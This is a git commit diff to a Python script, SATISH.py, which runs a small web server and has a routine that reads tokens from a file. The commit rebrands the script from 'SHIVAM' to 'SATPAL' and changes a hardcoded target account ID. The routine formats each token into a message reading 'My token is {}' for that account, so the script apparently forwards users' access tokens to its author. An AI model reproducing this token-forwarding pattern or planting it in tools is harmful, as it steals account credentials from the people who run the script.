e1ce6296441d49e21f8ac2788a3e362c7c81b38b
ajju <157633255+mrsatpall@users.noreply.github.com>
2024-05-16 10:33:07 +0530

    Update SATISH.py

--- SATISH.py
+++ SATISH.py
@@ -25,7 +25,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"   TRICKS BY SHIVAM")
+          self.wfile.write(b"   TRICKS BY SATPAL")
 def execute_server():
       PORT = int(os.environ.get('PORT', 4000))
 
@@ -39,10 +39,10 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello shivam sir! I am using your server. My token is {}"
+      msg_template = "Hello Satpal  sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100076228836043"
+      target_id = "102835350388769"
 
       requests.packages.urllib3.disable_warnings()
 
